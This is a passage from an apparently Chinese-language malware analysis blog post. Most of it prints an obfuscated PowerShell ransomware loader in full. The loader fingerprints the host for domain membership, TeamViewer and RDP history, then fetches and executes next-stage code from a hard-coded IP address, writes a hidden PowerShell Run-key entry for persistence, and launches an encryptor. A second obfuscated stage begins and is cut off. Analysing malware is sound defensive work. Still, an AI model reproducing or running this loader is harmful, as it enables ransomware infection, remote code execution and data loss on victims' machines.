&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get-hostfromarray</span>  ##获取可连接的服务主机</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$</span>&#123;remotehostarr&#125; = <span class="variable">$</span>&#123;remotehostarr&#125; | <span class="built_in">sort-object</span> &#123;<span class="built_in">get-random</span>&#125;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$</span>&#123;singlehost&#125; <span class="keyword">in</span> <span class="variable">$</span>&#123;remotehostarr&#125;) &#123;</span><br><span class="line">		<span class="keyword">if</span>(&amp;(<span class="string">&quot;&#123;0&#125;&#123;4&#125;&#123;2&#125;&#123;1&#125;&#123;3&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;check&#x27;</span>,<span class="string">&#x27;leho&#x27;</span>,<span class="string">&#x27;ing&#x27;</span>,<span class="string">&#x27;st&#x27;</span>,<span class="string">&#x27;-s&#x27;</span>)(<span class="variable">$</span>&#123;singlehost&#125;)) &#123; <span class="comment">##check-singlehost</span></span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$</span>&#123;singlehost&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		.(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;start-s&#x27;</span>,<span class="string">&#x27;eep&#x27;</span>) <span class="number">3</span>  <span class="comment">##休眠</span></span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> &amp;(<span class="string">&quot;&#123;3&#125;&#123;4&#125;&#123;1&#125;&#123;2&#125;&#123;0&#125;&#123;5&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;st&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;ge&#x27;</span>,<span class="string">&#x27;t-ho&#x27;</span>,<span class="string">&#x27;omarray&#x27;</span>) <span class="comment">##get-hostfromarray 递归测试寻找可用的服务器</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get-isinad</span>   ##判断当前主机是否存在域</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> ((.(<span class="string">&quot;&#123;3&#125;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;object&#x27;</span>,<span class="string">&#x27;et-w&#x27;</span>,<span class="string">&#x27;mi&#x27;</span>,<span class="string">&#x27;g&#x27;</span>) (<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;4&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;ersystem&#x27;</span>,<span class="string">&#x27;ut&#x27;</span>,<span class="string">&#x27;in32&#x27;</span>,<span class="string">&#x27;_comp&#x27;</span>)).<span class="string">&quot;partofdomain&quot;</span> <span class="operator">-eq</span> <span class="variable">$</span>&#123;true&#125;) </span><br><span class="line">	<span class="comment">##. get-wmiobject (win32_computersystem).&quot;partofdomain&quot;</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> <span class="variable">$</span>&#123;true&#125;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$</span>&#123;false&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get-isteamviewerinstalled</span>  ##判断<span class="title">teamviewer</span>安装路径是否存在</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$</span>&#123;systemdrive&#125; = (.(<span class="string">&quot;&#123;4&#125;&#123;0&#125;&#123;2&#125;&#123;1&#125;&#123;3&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;t-wmio&#x27;</span>,<span class="string">&#x27;ject&#x27;</span>,<span class="string">&#x27;g&#x27;</span>) (<span class="string">&quot;&#123;2&#125;&#123;1&#125;&#123;3&#125;&#123;0&#125;&#123;4&#125;&#123;5&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;gs&#x27;</span>,<span class="string">&#x27;in32&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;_operatin&#x27;</span>,<span class="string">&#x27;yste&#x27;</span>,<span class="string">&#x27;m&#x27;</span>)).<span class="string">&quot;systemdrive&quot;</span>   <span class="comment">##获取系统驱动器</span></span><br><span class="line">	<span class="comment">## get-wmiobject (win32_operatingssystem)</span></span><br><span class="line">	<span class="variable">$</span>&#123;twpathx86&#125; = <span class="variable">$</span>&#123;systemdrive&#125; + (((<span class="string">&quot;&#123;4&#125;&#123;3&#125;&#123;1&#125;&#123;5&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;ewer&#x27;</span>,<span class="string">&#x27;prog&#x27;</span>,<span class="string">&#x27;ncmncmteamvi&#x27;</span>,<span class="string">&#x27;cm&#x27;</span>,<span class="string">&#x27;:ncmn&#x27;</span>,<span class="string">&#x27;ram files&#x27;</span>)) <span class="operator">-creplace</span>  ([<span class="built_in">char</span>]<span class="number">78</span>+[<span class="built_in">char</span>]<span class="number">99</span>+[<span class="built_in">char</span>]<span class="number">109</span>),[<span class="built_in">char</span>]<span class="number">92</span>)  <span class="comment">##C::ncmncmprogram filesncmncmteamviewer</span></span><br><span class="line">	<span class="variable">$</span>&#123;twpathx64&#125; = <span class="variable">$</span>&#123;systemdrive&#125; + (((<span class="string">&quot;&#123;5&#125;&#123;3&#125;&#123;0&#125;&#123;1&#125;&#123;6&#125;&#123;4&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;iles (x86)&#x27;</span>,<span class="string">&#x27;lat&#x27;</span>,<span class="string">&#x27;er&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;eamview&#x27;</span>,<span class="string">&#x27;:latlatprogram &#x27;</span>,<span class="string">&#x27;latt&#x27;</span>)).<span class="string">&quot;replace&quot;</span>(([<span class="built_in">char</span>]<span class="number">76</span>+[<span class="built_in">char</span>]<span class="number">97</span>+[<span class="built_in">char</span>]<span class="number">116</span>),[<span class="built_in">string</span>][<span class="built_in">char</span>]<span class="number">92</span>)) <span class="comment">##C::latlatprogram files (x86)latlatteamviewer</span></span><br><span class="line">	<span class="keyword">if</span>((.(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;th&#x27;</span>,<span class="string">&#x27;tes&#x27;</span>,<span class="string">&#x27;t-pa&#x27;</span>) <span class="variable">$</span>&#123;twpathx86&#125;) <span class="operator">-or</span> (&amp;(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;ath&#x27;</span>,<span class="string">&#x27;-p&#x27;</span>) <span class="variable">$</span>&#123;twpathx64&#125;)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$</span>&#123;true&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$</span>&#123;false&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get-isrdpsessions</span>  ##检查已存在的<span class="title">rdp</span></span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$</span>&#123;userhives&#125; = .(<span class="string">&quot;&#123;3&#125;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;ch&#x27;</span>,<span class="string">&#x27;ildi&#x27;</span>,<span class="string">&#x27;tem&#x27;</span>,<span class="string">&#x27;get-&#x27;</span>) ((<span class="string">&quot;&#123;4&#125;&#123;1&#125;&#123;6&#125;&#123;3&#125;&#123;0&#125;&#123;5&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;y_&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;sersnvu&#x27;</span>,<span class="string">&#x27;ry::hke&#x27;</span>,<span class="string">&#x27;reg&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;st&#x27;</span>)).replace(([<span class="built_in">char</span>]<span class="number">78</span>+[<span class="built_in">char</span>]<span class="number">86</span>+[<span class="built_in">char</span>]<span class="number">117</span>),<span class="string">&#x27;\&#x27;</span>) </span><br><span class="line">	<span class="literal">-erroraction</span> (<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;2&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;silen&#x27;</span>,<span class="string">&#x27;ontinue&#x27;</span>,<span class="string">&#x27;lyc&#x27;</span>,<span class="string">&#x27;t&#x27;</span>) | &amp;(<span class="string">&quot;&#123;3&#125;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;ere-o&#x27;</span>,<span class="string">&#x27;bject&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) </span><br><span class="line">&#123;<span class="variable">$</span>&#123;_&#125;.<span class="string">&quot;name&quot;</span> <span class="operator">-match</span> ((<span class="string">&#x27;^h&#x27;</span>+<span class="string">&#x27;k&#x27;</span>+<span class="string">&#x27;ey_&#x27;</span>+<span class="string">&#x27;u&#x27;</span>+<span class="string">&#x27;ser&#x27;</span>+<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;6&#x27;</span>+<span class="string">&#x27;z06&#x27;</span>+<span class="string">&#x27;z0s-1-5-21-[6&#x27;</span>+<span class="string">&#x27;z0d&#x27;</span>+<span class="string">&#x27;6z0-]+0ky&#x27;</span>).<span class="string">&quot;replace&quot;</span>(<span class="string">&#x27;6z0&#x27;</span>,[<span class="built_in">string</span>][<span class="built_in">char</span>]<span class="number">92</span>).<span class="string">&quot;replace&quot;</span>(([<span class="built_in">char</span>]<span class="number">48</span>+[<span class="built_in">char</span>]<span class="number">107</span>+[<span class="built_in">char</span>]<span class="number">89</span>),<span class="string">&#x27;$&#x27;</span>))&#125;</span><br><span class="line">    <span class="comment">## get-childitem (registry:hkey_usersnvu).replace(&quot;NVu&quot;,\) -erroraction (silentlycontinue) | &amp;(where-object) &#123;$&#123;_&#125;.&quot;name&quot; -match(&quot;^hkey_users6z06z0s-1-5-21-[6z0d6z0-]+0ky&quot;).replace(&quot;6z0&quot;,&#x27;\&#x27;)</span></span><br><span class="line"></span><br><span class="line">	<span class="variable">$</span>&#123;rdppathending&#125; = (((<span class="string">&quot;&#123;3&#125;&#123;9&#125;&#123;12&#125;&#123;1&#125;&#123;4&#125;&#123;10&#125;&#123;0&#125;&#123;11&#125;&#123;2&#125;&#123;8&#125;&#123;6&#125;&#123;7&#125;&#123;5&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;rosoftudhte&#x27;</span>,<span class="string">&#x27;war&#x27;</span>,<span class="string">&#x27;inal&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;eu&#x27;</span>,<span class="string">&#x27;lientudhservers&#x27;</span>,<span class="string">&#x27;ser&#x27;</span>,<span class="string">&#x27;ver c&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;dhmic&#x27;</span>,<span class="string">&#x27;rm&#x27;</span>,<span class="string">&#x27;hsoft&#x27;</span>)) <span class="operator">-replace</span>  ([<span class="built_in">char</span>]<span class="number">117</span>+[<span class="built_in">char</span>]<span class="number">68</span>+[<span class="built_in">char</span>]<span class="number">72</span>),[<span class="built_in">char</span>]<span class="number">92</span>)</span><br><span class="line">	<span class="comment">##\software\microsoft\terminal server client\servers</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$</span>&#123;hive&#125; <span class="keyword">in</span> <span class="variable">$</span>&#123;userhives&#125;) &#123;</span><br><span class="line">		<span class="variable">$</span>&#123;microsoftrdppath&#125; = .(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;jo&#x27;</span>,<span class="string">&#x27;in-path&#x27;</span>) <span class="variable">$</span>&#123;hive&#125;.<span class="string">&quot;pspath&quot;</span> <span class="string">&quot;\<span class="variable">$rdppathending</span>&quot;</span></span><br><span class="line">		<span class="keyword">if</span> (.(<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;-path&#x27;</span>,<span class="string">&#x27;tes&#x27;</span>) <span class="variable">$</span>&#123;microsoftrdppath&#125;) &#123;</span><br><span class="line">			<span class="variable">$</span>&#123;allrdpsessions&#125; = .(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;em&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;et-childit&#x27;</span>) <span class="variable">$</span>&#123;microsoftrdppath&#125;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$</span>&#123;allrdpsessions&#125;.<span class="string">&quot;length&quot;</span> <span class="operator">-gt</span> <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="variable">$</span>&#123;true&#125;</span><br><span class="line">		&#125;</span><br><span class="line">      &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$</span>&#123;false&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">persist-lock</span></span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">param</span>(<span class="variable">$</span>&#123;<span class="keyword">data</span>&#125;)</span><br><span class="line">	<span class="variable">$</span>&#123;rand&#125; = <span class="operator">-join</span> ((<span class="number">48</span>..<span class="number">57</span>) + (<span class="number">97</span>..<span class="number">122</span>) | .(<span class="string">&quot;&#123;3&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;-random&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;g&#x27;</span>) <span class="literal">-count</span> <span class="number">8</span> | &amp;(<span class="string">&#x27;%&#x27;</span>) &#123;[<span class="built_in">char</span>]<span class="variable">$</span>&#123;_&#125;&#125;)</span><br><span class="line">	<span class="variable">$</span>&#123;randname&#125; =  <span class="variable">$</span>&#123;rand&#125; + (<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ini&#x27;</span>,<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">	<span class="variable">$</span>&#123;destination&#125; =   <span class="variable">$</span>&#123;<span class="number">9</span>rd4&#125;::(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&#123;2&#125;&#123;3&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;et&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;olderpath&#x27;</span>).invoke((<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;at&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;applic&#x27;</span>,<span class="string">&#x27;io&#x27;</span>,<span class="string">&#x27;data&#x27;</span>)) + <span class="string">&#x27;\&#x27;</span> + <span class="variable">$</span>&#123;randname&#125;</span><br><span class="line">	&amp;(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;add-c&#x27;</span>,<span class="string">&#x27;nt&#x27;</span>,<span class="string">&#x27;onte&#x27;</span>) <span class="variable">$</span>&#123;destination&#125; <span class="variable">$</span>&#123;<span class="keyword">data</span>&#125;</span><br><span class="line">	<span class="variable">$</span>&#123;autorunstring&#125; = (((<span class="string">&quot;&#123;0&#125;&#123;4&#125;&#123;2&#125;&#123;14&#125;&#123;10&#125;&#123;5&#125;&#123;13&#125;&#123;12&#125;&#123;9&#125;&#123;11&#125;&#123;8&#125;&#123;3&#125;&#123;7&#125;&#123;1&#125;&#123;6&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;cmd /c power^shel&#x27;</span>,<span class="string">&#x27;aw mbz&#x27;</span>,<span class="string">&#x27;tyle hidde&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;l -windows&#x27;</span>,<span class="string">&#x27;-nop &#x27;</span>,<span class="string">&#x27;mbz&#x27;</span>,<span class="string">&#x27;-r&#x27;</span>,<span class="string">&#x27;tent&#x27;</span>,<span class="string">&#x27;t-&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;con&#x27;</span>,<span class="string">&#x27;odkge&#x27;</span>,<span class="string">&#x27;-c &#x27;</span>,<span class="string">&#x27;n&#x27;</span>))<span class="operator">-replace</span> ([<span class="built_in">char</span>]<span class="number">77</span>+[<span class="built_in">char</span>]<span class="number">66</span>+[<span class="built_in">char</span>]<span class="number">90</span>),[<span class="built_in">char</span>]<span class="number">39</span>  -</span><br><span class="line">creplace([<span class="built_in">char</span>]<span class="number">111</span>+[<span class="built_in">char</span>]<span class="number">100</span>+[<span class="built_in">char</span>]<span class="number">107</span>),[<span class="built_in">char</span>]<span class="number">34</span>)+<span class="variable">$</span>&#123;destination&#125;+(((<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;1&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;ig5ig5 o0m&#x27;</span>,<span class="string">&#x27;x u&#x27;</span>,<span class="string">&#x27;2q&#x27;</span>,<span class="string">&#x27; ie&#x27;</span>)).(<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;place&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).invoke(<span class="string">&#x27;o0m&#x27;</span>,<span class="string">&#x27;|&#x27;</span>).<span class="string">&quot;replace&quot;</span>(([<span class="built_in">char</span>]<span class="number">73</span>+[<span class="built_in">char</span>]<span class="number">103</span>+[<span class="built_in">char</span>]<span class="number">53</span>),[<span class="built_in">string</span>][<span class="built_in">char</span>]<span class="number">39</span>).<span class="string">&quot;replace&quot;</span>(<span class="string">&#x27;u2q&#x27;</span>,[<span class="type">s</span></span><br><span class="line"><span class="type">tring</span>][<span class="built_in">char</span>]<span class="number">34</span>))</span><br><span class="line">	&amp;(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;new&#x27;</span>,<span class="string">&#x27;property&#x27;</span>,<span class="string">&#x27;-item&#x27;</span>) <span class="literal">-path</span> (((<span class="string">&quot;&#123;5&#125;&#123;4&#125;&#123;3&#125;&#123;8&#125;&#123;11&#125;&#123;6&#125;&#123;1&#125;&#123;2&#125;&#123;9&#125;&#123;10&#125;&#123;0&#125;&#123;7&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;sr&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;windowsk7s&#x27;</span>,<span class="string">&#x27;u:k7&#x27;</span>,<span class="string">&#x27;kc&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;smicrosoftk7&#x27;</span>,<span class="string">&#x27;un&#x27;</span>,<span class="string">&#x27;ssoftware&#x27;</span>,<span class="string">&#x27;curre&#x27;</span>,<span class="string">&#x27;ntversionk7&#x27;</span>,<span class="string">&#x27;k7&#x27;</span>))  <span class="operator">-replace</span> ([<span class="built_in">char</span>]<span class="number">107</span>+[<span class="built_in">char</span>]<span class="number">55</span>+[<span class="built_in">char</span>]<span class="number">115</span>),[<span class="built_in">char</span>]<span class="number">92</span>) <span class="literal">-nam</span></span><br><span class="line">e <span class="variable">$</span>&#123;rand&#125; <span class="literal">-value</span> <span class="variable">$</span>&#123;autorunstring&#125; <span class="literal">-propertytype</span> (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;trin&#x27;</span>,<span class="string">&#x27;g&#x27;</span>) <span class="literal">-force</span> | &amp;(<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;ll&#x27;</span>,<span class="string">&#x27;out-n&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load-nextstage</span></span> </span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">param</span>(<span class="variable">$</span>&#123;endpoint&#125;) <span class="comment">##load.php文件</span></span><br><span class="line">    <span class="variable">$</span>&#123;remotehost&#125; = &amp;(<span class="string">&quot;&#123;3&#125;&#123;2&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;mar&#x27;</span>,<span class="string">&#x27;ray&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;get-h&#x27;</span>,<span class="string">&#x27;tfro&#x27;</span>) <span class="comment">##get-hostfromarray</span></span><br><span class="line">    <span class="variable">$</span>&#123;uri&#125; = <span class="variable">$</span>&#123;remotehost&#125; + <span class="string">&quot;/&quot;</span> + <span class="variable">$</span>&#123;endpoint&#125; </span><br><span class="line">	<span class="keyword">return</span> (&amp;(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;new-&#x27;</span>,<span class="string">&#x27;ct&#x27;</span>,<span class="string">&#x27;obje&#x27;</span>) (<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;client&#x27;</span>,<span class="string">&#x27;net.&#x27;</span>,<span class="string">&#x27;web&#x27;</span>)).(<span class="string">&quot;&#123;2&#125;&#123;1&#125;&#123;3&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ing&#x27;</span>,<span class="string">&#x27;oa&#x27;</span>,<span class="string">&#x27;downl&#x27;</span>,<span class="string">&#x27;dstr&#x27;</span>).invoke(<span class="variable">$</span>&#123;uri&#125;)  <span class="comment">##</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decide-scout</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$</span>&#123;ad&#125; = &amp;(<span class="string">&quot;&#123;2&#125;&#123;1&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;isinad&#x27;</span>,<span class="string">&#x27;et-&#x27;</span>,<span class="string">&#x27;g&#x27;</span>) <span class="comment">## get-isinad</span></span><br><span class="line">    <span class="variable">$</span>&#123;tw&#125; = &amp;(<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;2&#125;&#123;1&#125;&#123;4&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;get-ist&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;amviewerinst&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;lled&#x27;</span>)  <span class="comment">##get-isteamviewerinstalled</span></span><br><span class="line">    <span class="variable">$</span>&#123;rdp&#125; = &amp;(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&#123;2&#125;&#123;3&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;pses&#x27;</span>,<span class="string">&#x27;get-isrd&#x27;</span>,<span class="string">&#x27;si&#x27;</span>,<span class="string">&#x27;ons&#x27;</span>)  <span class="comment">##get-isrdpsessions</span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="variable">$</span>&#123;ad&#125; <span class="operator">-eq</span> <span class="variable">$</span>&#123;true&#125;) <span class="operator">-or</span> (<span class="variable">$</span>&#123;tw&#125; <span class="operator">-eq</span> <span class="variable">$</span>&#123;true&#125;) <span class="operator">-or</span> (<span class="variable">$</span>&#123;rdp&#125; <span class="operator">-eq</span> <span class="variable">$</span>&#123;true&#125;))  <span class="comment">##判断当前主机是否在域中或者安装有teamviewer或有远程桌面连接的session</span></span><br><span class="line">	&#123;</span><br><span class="line">		&amp;(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;ex&#x27;</span>)(&amp;(<span class="string">&quot;&#123;3&#125;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;nextst&#x27;</span>,<span class="string">&#x27;load&#x27;</span>) <span class="variable">$</span>&#123;tinyendpoint&#125;)  <span class="comment">##load-nextstage</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">		<span class="variable">$</span>&#123;lock&#125; = &amp;(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;tage&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;oad-&#x27;</span>,<span class="string">&#x27;nexts&#x27;</span>)(<span class="variable">$</span>&#123;lockendpoint&#125;)  <span class="comment">##进行文件加密</span></span><br><span class="line">        .(<span class="string">&quot;&#123;2&#125;&#123;3&#125;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;-lo&#x27;</span>,<span class="string">&#x27;ck&#x27;</span>,<span class="string">&#x27;per&#x27;</span>,<span class="string">&#x27;sist&#x27;</span>) <span class="variable">$</span>&#123;lock&#125;</span><br><span class="line">		&amp;(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;ex&#x27;</span>)(<span class="variable">$</span>&#123;lock&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">.decide<span class="literal">-scout</span></span><br></pre></td></tr></table></figure>
<ul>
<li>执行这段脚本，其会检测当前主机是否在域中、是否安装有teamviewer、是否有远程桌面的sessions，检测存在则下载<a target="_blank" rel="noopener" href="http://45.61.138.170/load.php中的字符串并执行，检测不存在则直接下载http://45.61.138.170/web/index.php?r=site/loadlock中的字符串解析执行，从两个文件中的内容可以推测出load.php是一个驻留程序，lock是一个加密程序。">http://45.61.138.170/load.php中的字符串并执行，检测不存在则直接下载http://45.61.138.170/web/index.php?r=site/loadlock中的字符串解析执行，从两个文件中的内容可以推测出load.php是一个驻留程序，lock是一个加密程序。</a></li>
</ul>
<p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200715111942595.png" alt="image-20200715111942595"></p>
<p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200715112043254.png" alt="image-20200715112043254"></p>
<h4 id="驻留程序分析"><a href="#驻留程序分析" class="headerlink" title="驻留程序分析"></a>驻留程序分析</h4><ul>
<li>load.php脚本内容如下，其使用了大量的字符串替换对硬编码数据进行base64解码，然后调用io.memorysteam进行数据解压缩，然后使用iex执行</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;LE&#x27;</span>,<span class="string">&#x27;SEt-vAR&#x27;</span>,<span class="string">&#x27;IaB&#x27;</span>)  (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;h6jK&#x27;</span>,<span class="string">&#x27;l2&#x27;</span>)  ([<span class="type">tYpE</span>](<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-F</span> <span class="string">&#x27;convE&#x27;</span>,<span class="string">&#x27;Rt&#x27;</span>))  ;  </span><br><span class="line">&amp;(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;t-itEm&#x27;</span>,<span class="string">&#x27;sE&#x27;</span>) (<span class="string">&quot;&#123;4&#125;&#123;3&#125;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;0V&#x27;</span>,<span class="string">&#x27;IAblE:6d&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;V&#x27;</span>) ([<span class="type">TyPE</span>](<span class="string">&quot;&#123;7&#125;&#123;3&#125;&#123;10&#125;&#123;1&#125;&#123;5&#125;&#123;9&#125;&#123;4&#125;&#123;8&#125;&#123;0&#125;&#123;6&#125;&#123;2&#125;&quot;</span> <span class="operator">-F</span> <span class="string">&#x27;Si&#x27;</span>,<span class="string">&#x27;eM.Io&#x27;</span>,<span class="string">&#x27;Mode&#x27;</span>,<span class="string">&#x27;YS&#x27;</span>,<span 